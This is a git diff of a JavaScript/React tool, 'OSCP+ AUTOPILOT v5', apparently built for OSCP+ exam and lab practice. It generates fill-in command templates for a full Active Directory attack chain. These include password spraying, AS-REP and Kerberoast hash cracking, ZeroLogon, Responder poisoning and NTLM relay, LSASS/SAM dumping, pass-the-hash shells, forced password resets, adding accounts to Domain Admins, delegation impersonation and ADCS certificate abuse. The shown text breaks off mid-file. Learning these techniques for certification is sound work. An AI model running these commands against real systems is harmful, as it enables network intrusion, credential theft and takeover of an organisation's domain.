@@ -1,73 +1,120 @@
 const { useState, useCallback, useMemo, useEffect, useRef } = window.React;
 
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-// OSCP+ AUTOPILOT v4 — Decision Engine for OSCP+ 2026
+// OSCP+ AUTOPILOT v5 — Decision Engine for OSCP+ 2026
 // Format: 1 AD Set (40pts) + 3 Standalones (60pts) = 100pts
-// Pass: 70pts | Assumed breach AD | 23h45m + 24h report
+// Pass: 70pts | 23h45m + 24h report
+// Works for: Exam, PG Practice, HTB, Lainkusanagi, any AD env
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-// ─── AD ATTACK CHAIN (assumed breach — you START with domain creds) ───
-const AD_CHAIN = [
+// ─── AD ATTACK PHASES — Full lifecycle from zero to DA ───
+const AD_PHASES = [
   {
-    phase: "1. Situational Awareness",
-    desc: "You start with a domain user. Map the terrain before attacking.",
+    phase: "0. External Recon (No Creds)",
+    desc: "Start from zero. Enumerate everything without credentials.",
+    requiresCreds: false,
+    color: "#3b82f6",
     steps: [
-      { action: "Confirm domain access", cmd: (u,p,d,dc) => `# Verify your creds work:\nnetexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'\n\n# Or with rpcclient:\nrpcclient -U '${d||"domain"}/${u||"user"}%${p||"password"}' ${dc||"DC_IP"}`, check: "Creds valid? What groups are you in?" },
-      { action: "Enumerate domain info", cmd: (u,p,d,dc) => `# Domain info:\nnetexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --users\nnetexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --groups\n\n# LDAP enum:\nldapsearch -x -H ldap://${dc||"DC_IP"} -D '${u||"user"}@${d||"domain.local"}' -w '${p||"password"}' -b "DC=${(d||"domain.local").split('.').join(',DC=')}" "(objectClass=user)" sAMAccountName memberOf description`, check: "Users? Groups? Descriptions with passwords?" },
-      { action: "Run BloodHound", cmd: (u,p,d,dc) => `# Collect BloodHound data:\nbloodhound-python -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' -ns ${dc||"DC_IP"} -c all\n\n# Or SharpHound from Windows:\n.\\SharpHound.exe -c all --domain ${d||"domain.local"}\n\n# Import .json/.zip into BloodHound GUI\n# Check: Shortest Path to Domain Admin\n# Check: Kerberoastable users\n# Check: AS-REP Roastable users\n# Check: ACL abuse paths`, check: "CRITICAL: Find attack paths to DA", critical: true },
-      { action: "Enumerate shares", cmd: (u,p,d,dc) => `netexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --shares\nsmbmap -H ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'`, check: "SYSVOL? NETLOGON? Custom shares with scripts/creds?" },
-      { action: "Find domain computers", cmd: (u,p,d,dc) => `netexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --computers\n\n# Check which machines you can access:\nnetexec smb TARGETS_FILE -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'`, check: "Which machines can you access? Admin on any?" },
+      { action: "Full port scan all AD machines", cmd: (t,u,p,d,dc) => `# Scan ALL machines in the AD set simultaneously:\nnmap -p- --min-rate 5000 -oA nmap/full_${t||"TARGET"} ${t||"TARGET"}\nnmap -sC -sV -oA nmap/initial_${t||"TARGET"} ${t||"TARGET"}\nsudo nmap -sU --top-ports 20 -oA nmap/udp_${t||"TARGET"} ${t||"TARGET"}`, check: "Key AD ports: 53, 88, 135, 139, 389, 445, 636, 3268, 5985", critical: true },
+      { action: "Identify the Domain Controller", cmd: (t) => `# The DC usually has ports 53+88+389+636+3268 open\nnmap -p53,88,389,636,3268 ${t||"TARGET"}\n\n# DNS SRV records:\nnslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN ${t||"TARGET"}\n\n# LDAP rootDSE (no auth needed):\nldapsearch -x -H ldap://${t||"TARGET"} -b "" -s base defaultNamingContext dnsHostName`, check: "Which machine is the DC? What's the domain name?", critical: true },
+      { action: "Anonymous LDAP enumeration", cmd: (t) => `# Try anonymous bind:\nldapsearch -x -H ldap://${t||"TARGET"} -b "" -s base namingContexts\nldapsearch -x -H ldap://${t||"TARGET"} -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName description memberOf 2>/dev/null | head -100\n\n# Nmap LDAP scripts:\nnmap --script ldap-rootdse,ldap-search -p389 ${t||"TARGET"}`, check: "Anonymous bind allowed? Domain name? Users?", critical: true },
+      { action: "Null session SMB / RPC", cmd: (t) => `# SMB null session:\nnetexec smb ${t||"TARGET"} -u '' -p '' --shares\nnetexec smb ${t||"TARGET"} -u 'guest' -p '' --shares\nsmbmap -H ${t||"TARGET"} -u '' -p ''\nsmbclient -L //${t||"TARGET"} -N\n\n# RPC null session:\nrpcclient -U "" -N ${t||"TARGET"} -c "enumdomusers;enumdomgroups;querydispinfo"\nenum4linux-ng -A ${t||"TARGET"} | tee enum4linux.txt`, check: "Null/guest access? Users list? Share names?", critical: true },
+      { action: "DNS zone transfer & enumeration", cmd: (t) => `# Zone transfer (often works on DCs):\ndig axfr @${t||"TARGET"} DOMAIN\ndnsrecon -d DOMAIN -n ${t||"TARGET"} -t axfr\n\n# Reverse lookups for subnet:\ndnsrecon -r SUBNET/24 -n ${t||"TARGET"}\n\n# Brute subdomains:\ngobuster dns -d DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r ${t||"TARGET"}:53`, check: "Internal hostnames? Other machines in the domain?" },
+      { action: "SNMP enumeration", cmd: (t) => `# Brute community strings:\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt ${t||"TARGET"}\n\n# Walk with found string:\nsnmpwalk -v2c -c public ${t||"TARGET"} . | tee snmpwalk.txt\n\n# Extract users:\nsnmpwalk -v2c -c public ${t||"TARGET"} 1.3.6.1.4.1.77.1.2.25\n\n# Extract running processes (may leak creds in cmdline):\nsnmpwalk -v2c -c public ${t||"TARGET"} 1.3.6.1.2.1.25.4.2.1.2\n\n# Extract installed software:\nsnmpwalk -v2c -c public ${t||"TARGET"} 1.3.6.1.2.1.25.6.3.1.2`, check: "Users? Processes with creds in cmdline? Software versions?", critical: true },
+      { action: "Kerberos user enumeration (no creds)", cmd: (t) => `# Enumerate valid domain users via Kerberos:\nkerbrute userenum -d DOMAIN --dc ${t||"TARGET"} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt\n\n# Smaller list first:\nkerbrute userenum -d DOMAIN --dc ${t||"TARGET"} /usr/share/seclists/Usernames/top-usernames-shortlist.txt\n\n# Save valid users to file for next steps`, check: "Valid domain usernames for spraying and AS-REP?", critical: true },
+      { action: "Web services on AD machines", cmd: (t) => `# Check for web apps on member servers or DC:\nwhatweb http://${t||"TARGET"} -v\ncurl -I http://${t||"TARGET"}\nferoxbuster -u http://${t||"TARGET"} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html,asp,aspx\n\n# Also check HTTPS and alt ports:\ncurl -Ik https://${t||"TARGET"}\ncurl -I http://${t||"TARGET"}:8080`, check: "Web apps? Login portals? Upload functionality?" },
     ]
   },
   {
-    phase: "2. Credential Harvesting",
+    phase: "1. Initial Foothold (Getting First Creds)",
+    desc: "Obtain your first set of domain credentials through any means.",
+    requiresCreds: false,
+    color: "#3b82f6",
+    steps: [
+      { action: "AS-REP Roasting (no creds needed!)", cmd: (t) => `# Find accounts without Kerberos pre-auth:\nimpacket-GetNPUsers DOMAIN/ -dc-ip ${t||"TARGET"} -usersfile users.txt -no-pass -outputfile asrep.txt\n\n# Crack the hashes:\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`, check: "Pre-auth disabled accounts = free hashes!", critical: true },
+      { action: "Password spraying (common passwords)", cmd: (t) => `# Spray with common OSCP patterns (careful: lockout!):\nnetexec smb ${t||"TARGET"} -u users.txt -p 'Welcome1!' --continue-on-success\nnetexec smb ${t||"TARGET"} -u users.txt -p 'Password1' --continue-on-success\nnetexec smb ${t||"TARGET"} -u users.txt -p 'Spring2026!' --continue-on-success\nnetexec smb ${t||"TARGET"} -u users.txt -p 'Company123!' --continue-on-success\n\n# Username = password:\nnetexec smb ${t||"TARGET"} -u users.txt -p users.txt --no-bruteforce --continue-on-success`, check: "Common passwords? Username=password?", critical: true },
+      { action: "Exploit web services", cmd: (t) => `# If you found web apps in Phase 0:\n# - Try default credentials on login pages\n# - Check for known CVEs (searchsploit)\n# - SQL injection for creds\n# - File upload for shell → dump creds from machine\n# - LFI to read config files with DB/domain creds\n\nsearchsploit 'service version'\nsqlmap -u "http://${t||"TARGET"}/page?param=1" --batch --dbs`, check: "Web RCE? Creds in config files? DB with domain users?" },
+      { action: "Exploit known service vulns", cmd: (t) => `# Common on AD labs:\n# EternalBlue (SMB):\nnmap --script smb-vuln-ms17-010 -p445 ${t||"TARGET"}\n\n# PrintNightmare:\n# ZeroLogon (CVE-2020-1472):\nimpacket-zerologon DOMAIN/DC_HOSTNAME\\$ ${t||"TARGET"}\n\n# Check MSSQL:\nimpacket-mssqlclient sa:''@${t||"TARGET"}\nnmap --script ms-sql-empty-password -p1433 ${t||"TARGET"}`, check: "Known CVEs? MSSQL default creds? EternalBlue?", critical: true },
+      { action: "SNMP credential extraction", cmd: (t) => `# If SNMP was open — look for creds in process cmdlines:\nsnmpwalk -v2c -c public ${t||"TARGET"} 1.3.6.1.2.1.25.4.2.1.5 | grep -i "pass\\|cred\\|user"\n\n# Extended objects (NET-SNMP-EXTEND-MIB):\nsnmpwalk -v2c -c public ${t||"TARGET"} NET-SNMP-EXTEND-MIB::nsExtendOutputFull`, check: "Credentials leaked in process command lines?" },
+      { action: "Readable SMB shares (anon/guest)", cmd: (t) => `# Download everything from accessible shares:\nsmbclient //${t||"TARGET"}/SHARE -N -c 'recurse;prompt;mget *'\n\n# Search for creds in downloaded files:\ngrep -ri 'password\\|passwd\\|credential\\|secret' loot/ 2>/dev/null\nfind loot/ -name "*.txt" -o -name "*.xml" -o -name "*.conf" -o -name "*.ini" -o -name "*.config" | xargs grep -li "pass" 2>/dev/null`, check: "Config files? Scripts with hardcoded creds?" },
+      { action: "LLMNR/NBT-NS Poisoning", cmd: (t) => `# If you have initial machine access (e.g. via web shell):\n# Run Responder to capture Net-NTLMv2 hashes:\nsudo responder -I eth0 -dwv\n\n# Crack captured hashes:\nhashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Relay (if SMB signing disabled):\nimpacket-ntlmrelayx -tf targets.txt -smb2support -i\nimpacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'`, check: "Captured NTLMv2 hashes? Relay possible?" },
+    ]
+  },
+  {
+    phase: "2. Situational Awareness (With Creds)",
+    desc: "You have domain creds. Map the full domain before attacking.",
+    requiresCreds: true,
+    color: "#f97316",
+    steps: [
+      { action: "Confirm domain access", cmd: (t,u,p,d,dc) => `# Verify your creds work:\nnetexec smb ${dc||t||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'\n\n# Or with rpcclient:\nrpcclient -U '${d||"domain"}/${u||"user"}%${p||"password"}' ${dc||t||"DC_IP"}\n\n# Check your groups:\nnet rpc group members 'Domain Users' -U '${d||"domain"}/${u||"user"}%${p||"password"}' -S ${dc||t||"DC_IP"}`, check: "Creds valid? What groups are you in?" },
+      { action: "Enumerate domain info", cmd: (t,u,p,d,dc) => `# Users & groups:\nnetexec smb ${dc||t||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --users\nnetexec smb ${dc||t||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --groups\n\n# LDAP full enum:\nldapsearch -x -H ldap://${dc||t||"DC_IP"} -D '${u||"user"}@${d||"domain.local"}' -w '${p||"password"}' -b "DC=${(d||"domain.local").split('.').join(',DC=')}" "(objectClass=user)" sAMAccountName memberOf description\n\n# windapsearch:\npython3 windapsearch.py --dc-ip ${dc||t||"DC_IP"} -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' --users --groups --computers --da`, check: "Users? Groups? Descriptions with passwords?" },
+      { action: "Run BloodHound", cmd: (t,u,p,d,dc) => `# Collect BloodHound data:\nbloodhound-python -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' -ns ${dc||t||"DC_IP"} -c all\n\n# Or SharpHound from Windows:\n.\\SharpHound.exe -c all --domain ${d||"domain.local"}\n\n# Import .json/.zip into BloodHound GUI\n# CRITICAL QUERIES:\n# → Shortest Path to Domain Admin\n# → Kerberoastable users\n# → AS-REP Roastable users\n# → ACL abuse paths\n# → Shortest path from OWNED to DA`, check: "CRITICAL: Find attack paths to DA", critical: true },
+      { action: "Enumerate shares (authenticated)", cmd: (t,u,p,d,dc) => `netexec smb ${dc||t||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --shares\nsmbmap -H ${dc||t||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'\n\n# Spider all readable shares:\nnetexec smb ${dc||t||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' -M spider_plus -o DOWNLOAD_FLAG=true`, check: "SYSVOL? NETLOGON? Custom shares with scripts/creds?" },
+      { action: "Find domain computers & check access", cmd: (t,u,p,d,dc) => `# List all domain computers:\nnetexec smb ${dc||t||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --computers\n\n# Check which machines you can access:\nnetexec smb TARGETS_FILE -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'\nnetexec winrm TARGETS_FILE -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'`, check: "Which machines can you access? Admin on any? (Pwn3d!)" },
+      { action: "Check SMB signing", cmd: (t,u,p,d,dc) => `# Check if SMB signing is required (needed for relay attacks):\nnetexec smb TARGETS_FILE -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --gen-relay-list relay_targets.txt\n\n# If signing NOT required → NTLM relay is possible\ncat relay_targets.txt`, check: "SMB signing disabled = relay attack possible" },
+    ]
+  },
+  {
+    phase: "3. Credential Harvesting",
     desc: "Get more creds via Kerberos attacks, shares, and password spraying.",
+    requiresCreds: true,
+    color: "#f97316",
     steps: [
-      { action: "Kerberoasting", cmd: (u,p,d,dc) => `# Get TGS tickets for service accounts:\nimpacket-GetUserSPNs '${d||"domain.local"}/${u||"user"}:${p||"password"}' -dc-ip ${dc||"DC_IP"} -request -outputfile kerberoast.txt\n\n# Crack them:\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt`, check: "Service accounts often have weak passwords!", critical: true },
-      { action: "AS-REP Roasting", cmd: (u,p,d,dc) => `# Find accounts with no pre-auth:\nimpacket-GetNPUsers '${d||"domain.local"}/${u||"user"}:${p||"password"}' -dc-ip ${dc||"DC_IP"} -request -outputfile asrep.txt\n\n# Crack them:\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`, check: "Accounts without Kerberos pre-auth?" },
-      { action: "Search SYSVOL for creds", cmd: (u,p,d,dc) => `# GPP passwords (Group Policy Preferences):\nnetexec smb ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' -M gpp_password\n\n# Manual search:\nsmbclient //${dc||"DC_IP"}/SYSVOL -U '${d||"domain"}/${u||"user"}%${p||"password"}' -c 'recurse;prompt;mget *'\ngrep -ri password SYSVOL/ 2>/dev/null\nfind SYSVOL/ -name "*.xml" -exec grep -li "cpassword" {} \\;`, check: "GPP passwords? Scripts with creds?" },
-      { action: "Password spray", cmd: (u,p,d,dc) => `# Spray found passwords against all users:\nnetexec smb ${dc||"DC_IP"} -u users.txt -p '${p||"password"}' -d '${d||"domain.local"}' --continue-on-success\n\n# Try common passwords:\nnetexec smb ${dc||"DC_IP"} -u users.txt -p 'Season2026!' -d '${d||"domain.local"}' --continue-on-success\nnetexec smb ${dc||"DC_IP"} -u users.txt -p 'Welcome1!' -d '${d||"domain.local"}' --continue-on-success`, check: "Password reuse? Common patterns?" },
+      { action: "Kerberoasting", cmd: (t,u,p,d,dc) => `# Get TGS tickets for service accounts:\nimpacket-GetUserSPNs '${d||"domain.local"}/${u||"user"}:${p||"password"}' -dc-ip ${dc||t||"DC_IP"} -request -outputfile kerberoast.txt\n\n# Crack them:\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt\nhashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule`, check: "Service accounts often have weak passwords!", critical: true },
+      { action: "AS-REP Roasting (with user list)", cmd: (t,u,p,d,dc) => `# Find accounts with no pre-auth (full user list):\nimpacket-GetNPUsers '${d||"domain.local"}/${u||"user"}:${p||"password"}' -dc-ip ${dc||t||"DC_IP"} -request -outputfile asrep.txt\n\n# Crack them:\nhashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt`, check: "Accounts without Kerberos pre-auth?" },
+      { action: "Search SYSVOL / NETLOGON for creds", cmd: (t,u,p,d,dc) => `# GPP passwords (Group Policy Preferences):\nnetexec smb ${dc||t||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' -M gpp_password\nnetexec smb ${dc||t||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' -M gpp_autologin\n\n# Manual search:\nsmbclient //${dc||t||"DC_IP"}/SYSVOL -U '${d||"domain"}/${u||"user"}%${p||"password"}' -c 'recurse;prompt;mget *'\ngrep -ri password SYSVOL/ 2>/dev/null\nfind SYSVOL/ -name "*.xml" -exec grep -li "cpassword" {} \\;\nfind SYSVOL/ -name "*.ps1" -o -name "*.bat" -o -name "*.vbs" | xargs grep -li "pass" 2>/dev/null`, check: "GPP passwords? Scripts with creds? Logon scripts?" },
+      { action: "Password spray (with context)", cmd: (t,u,p,d,dc) => `# Spray found passwords against all users:\nnetexec smb ${dc||t||"DC_IP"} -u users.txt -p '${p||"password"}' -d '${d||"domain.local"}' --continue-on-success\n\n# Seasonal / common patterns:\nnetexec smb ${dc||t||"DC_IP"} -u users.txt -p 'Spring2026!' -d '${d||"domain.local"}' --continue-on-success\nnetexec smb ${dc||t||"DC_IP"} -u users.txt -p 'Welcome1!' -d '${d||"domain.local"}' --continue-on-success\nnetexec smb ${dc||t||"DC_IP"} -u users.txt -p 'Password1' -d '${d||"domain.local"}' --continue-on-success`, check: "Password reuse? Common patterns?" },
+      { action: "Dump LSASS / SAM on accessible machines", cmd: (t,u,p,d,dc) => `# If you have local admin on any machine:\nnetexec smb ${t||"TARGET"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --sam\nnetexec smb ${t||"TARGET"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --lsa\nnetexec smb ${t||"TARGET"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' -M lsassy\n\n# Or with secretsdump:\nimpacket-secretsdump '${d||"domain.local"}/${u||"user"}:${p||"password"}'@${t||"TARGET"}`, check: "Cached domain creds? Local admin hashes for reuse?" },
     ]
   },
   {
-    phase: "3. Lateral Movement",
+    phase: "4. Lateral Movement",
     desc: "Use found credentials to move across domain machines.",
+    requiresCreds: true,
+    color: "#f97316",
     steps: [
-      { action: "Check admin access", cmd: (u,p,d,dc) => `# Test creds on all machines:\nnetexec smb TARGETS -u '${u||"new_user"}' -p '${p||"new_pass"}' -d '${d||"domain.local"}'\nnetexec winrm TARGETS -u '${u||"new_user"}' -p '${p||"new_pass"}' -d '${d||"domain.local"}'`, check: "(Pwn3d!) means local admin!", critical: true },
-      { action: "PSExec / WMIExec", cmd: (u,p,d) => `# Get shell as admin:\nimpacket-psexec '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@TARGET\nimpacket-wmiexec '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@TARGET\nimpacket-atexec '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@TARGET`, check: "Try different exec methods if one fails" },
-      { action: "Evil-WinRM", cmd: (u,p,d) => `evil-winrm -i TARGET -u '${u||"admin"}' -p '${p||"password"}'`, check: "Port 5985 open? Best interactive shell" },
-      { action: "Dump local hashes", cmd: (u,p,d) => `# Dump SAM from compromised machine:\nimpacket-secretsdump '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@TARGET\n\n# Look for local admin hashes to reuse\n# Try Pass-the-Hash on other machines:\nnetexec smb TARGETS -u 'Administrator' -H NTLM_HASH --local-auth`, check: "Local admin hash reuse across machines?" },
-      { action: "Pass the Hash", cmd: (u,p,d) => `# PtH with found NTLM hash:\nimpacket-psexec -hashes :NTLM_HASH '${d||"domain.local"}/${u||"admin"}'@TARGET\nevil-winrm -i TARGET -u '${u||"admin"}' -H NTLM_HASH\nnetexec smb TARGETS -u '${u||"admin"}' -H NTLM_HASH -d '${d||"domain.local"}'`, check: "NTLM hash = password equivalent" },
+      { action: "Check admin access everywhere", cmd: (t,u,p,d,dc) => `# Test ALL creds on ALL machines:\nnetexec smb TARGETS -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'\nnetexec winrm TARGETS -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'\n\n# With hash:\nnetexec smb TARGETS -u '${u||"user"}' -H NTLM_HASH -d '${d||"domain.local"}'`, check: "(Pwn3d!) means local admin!", critical: true },
+      { action: "PSExec / WMIExec / ATExec", cmd: (t,u,p,d) => `# Get shell as admin:\nimpacket-psexec '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${t||"TARGET"}\nimpacket-wmiexec '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${t||"TARGET"}\nimpacket-atexec '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${t||"TARGET"}\nimpacket-smbexec '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${t||"TARGET"}`, check: "Try different exec methods if one fails" },
+      { action: "Evil-WinRM", cmd: (t,u,p,d) => `evil-winrm -i ${t||"TARGET"} -u '${u||"admin"}' -p '${p||"password"}'`, check: "Port 5985 open? Best interactive shell" },
+      { action: "Dump local hashes from owned machines", cmd: (t,u,p,d) => `# Dump SAM from compromised machine:\nimpacket-secretsdump '${d||"domain.local"}/${u||"admin"}:${p||"password"}'@${t||"TARGET"}\n\n# Look for local admin hashes to reuse\n# Try Pass-the-Hash on other machines:\nnetexec smb TARGETS -u 'Administrator' -H NTLM_HASH --local-auth`, check: "Local admin hash reuse across machines?" },
+      { action: "Pass the Hash", cmd: (t,u,p,d) => `# PtH with found NTLM hash:\nimpacket-psexec -hashes :NTLM_HASH '${d||"domain.local"}/${u||"admin"}'@${t||"TARGET"}\nevil-winrm -i ${t||"TARGET"} -u '${u||"admin"}' -H NTLM_HASH\nnetexec smb TARGETS -u '${u||"admin"}' -H NTLM_HASH -d '${d||"domain.local"}'`, check: "NTLM hash = password equivalent" },
     ]
   },
   {
-    phase: "4. ACL / Permission Abuse",
+    phase: "5. ACL / Permission Abuse",
     desc: "BloodHound shows attack paths via misconfigured permissions.",
+    requiresCreds: true,
+    color: "#f97316",
     steps: [
-      { action: "GenericAll on user", cmd: (u,p,d,dc) => `# If you have GenericAll on a user — change their password:\nnet rpc password '${u||"target_user"}' 'NewPassword123!' -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' -S ${dc||"DC_IP"}\n\n# Or with rpcclient:\nrpcclient -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' ${dc||"DC_IP"} -c "setuserinfo2 target_user 23 'NewPassword123!'"`, check: "GenericAll = full control over object" },
-      { action: "GenericAll on group", cmd: (u,p,d,dc) => `# Add yourself to a privileged group:\nnet rpc group addmem "Domain Admins" '${u||"attacker"}' -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' -S ${dc||"DC_IP"}`, check: "Can you add yourself to Domain Admins?" },
-      { action: "GenericWrite / WriteDACL", cmd: (u,p,d,dc) => `# WriteDACL: Give yourself more permissions:\nimpacket-dacledit -action write -rights FullControl -principal '${u||"attacker"}' -target 'target_user' '${d||"domain.local"}/${u||"attacker"}:${p||"password"}' -dc-ip ${dc||"DC_IP"}\n\n# GenericWrite: Set SPN for Kerberoasting:\npython3 targetedKerberoast.py -u '${u||"attacker"}' -p '${p||"password"}' -d '${d||"domain.local"}' --dc-ip ${dc||"DC_IP"}`, check: "Abuse write permissions to escalate" },
-      { action: "ForceChangePassword", cmd: (u,p,d,dc) => `# Change target user's password:\nnet rpc password 'target_user' 'NewPass123!' -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' -S ${dc||"DC_IP"}`, check: "Can change password without knowing old one" },
-      { action: "ReadGMSAPassword", cmd: (u,p,d,dc) => `# If you can read GMSA passwords:\nnetexec ldap ${dc||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --gmsa\n\n# Or with Python:\npython3 gMSADumper.py -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'`, check: "GMSA = service account with auto-rotating passwords" },
+      { action: "GenericAll on user", cmd: (t,u,p,d,dc) => `# If you have GenericAll on a user — change their password:\nnet rpc password 'TARGET_USER' 'NewPassword123!' -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' -S ${dc||t||"DC_IP"}\n\n# Or with rpcclient:\nrpcclient -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' ${dc||t||"DC_IP"} -c "setuserinfo2 TARGET_USER 23 'NewPassword123!'"`, check: "GenericAll = full control over object" },
+      { action: "GenericAll on group", cmd: (t,u,p,d,dc) => `# Add yourself to a privileged group:\nnet rpc group addmem "Domain Admins" '${u||"attacker"}' -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' -S ${dc||t||"DC_IP"}`, check: "Can you add yourself to Domain Admins?" },
+      { action: "GenericWrite / WriteDACL", cmd: (t,u,p,d,dc) => `# WriteDACL: Give yourself more permissions:\nimpacket-dacledit -action write -rights FullControl -principal '${u||"attacker"}' -target 'TARGET_USER' '${d||"domain.local"}/${u||"attacker"}:${p||"password"}' -dc-ip ${dc||t||"DC_IP"}\n\n# GenericWrite: Set SPN for targeted Kerberoasting:\npython3 targetedKerberoast.py -u '${u||"attacker"}' -p '${p||"password"}' -d '${d||"domain.local"}' --dc-ip ${dc||t||"DC_IP"}`, check: "Abuse write permissions to escalate" },
+      { action: "ForceChangePassword", cmd: (t,u,p,d,dc) => `# Change target user's password:\nnet rpc password 'TARGET_USER' 'NewPass123!' -U '${d||"domain"}/${u||"attacker"}%${p||"password"}' -S ${dc||t||"DC_IP"}`, check: "Can change password without knowing old one" },
+      { action: "ReadGMSAPassword", cmd: (t,u,p,d,dc) => `# If you can read GMSA passwords:\nnetexec ldap ${dc||t||"DC_IP"} -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}' --gmsa\n\n# Or with Python:\npython3 gMSADumper.py -u '${u||"user"}' -p '${p||"password"}' -d '${d||"domain.local"}'`, check: "GMSA = service account with auto-rotating passwords" },
+      { action: "Constrained / Unconstrained Delegation", cmd: (t,u,p,d,dc) => `# Find delegation in BloodHound or with:\nimpacket-findDelegation '${d||"domain.local"}/${u||"user"}:${p||"password"}' -dc-ip ${dc||t||"DC_IP"}\n\n# Unconstrained — if you compromise the server:\n# Monitor for TGTs with Rubeus:\n.\\Rubeus.exe monitor /interval:5\n\n# Constrained — S4U attack:\nimpacket-getST '${d||"domain.local"}/${u||"user"}:${p||"password"}' -spn 'cifs/DC.${d||"domain.local"}' -impersonate Administrator -dc-ip ${dc||t||"DC_IP"}\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass ${d||"domain.local"}/Administrator@DC.${d||"domain.local"}`, check: "Delegation abuse = impersonate DA" },
     ]
   },
   {
-    phase: "5. ADCS (Certificate Services)",
+    phase: "6. ADCS (Certificate Services)",
     desc: "If AD CS is present, abuse misconfigured certificate templates for DA.",
+    requiresCreds: true,
+    color: "#f97316",
     steps: [
-      { action: "Find ADCS + vulnerable templates", cmd: (u,p,d,dc) => `# Certipy — find all vulnerable templates:\ncertipy find -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -vulnerable -stdout\n\n# Or from Windows:\n.\\Certify.exe find /vulnerable`, check: "ESC1-ESC8 vulnerable templates?", critical: true },
-      { action: "ESC1 — Template abuse", cmd: (u,p,d,dc) => `# Request cert with SAN of DA:\ncertipy req -u '${u||"user"}@${d||"domain.local"}' -p '${p||"password"}' -dc-ip ${dc||"DC_IP"} -ca 'CA-NAME' -template 'VULN-TEMPLATE' -upn 'Administrator@${d||"domain.local"}'\n\n# Auth with the cert:\ncertipy auth -pfx administrator.pfx -dc-ip ${dc||"DC_IP"}`, check: "Get DA cert → auth as DA!", critical: true },
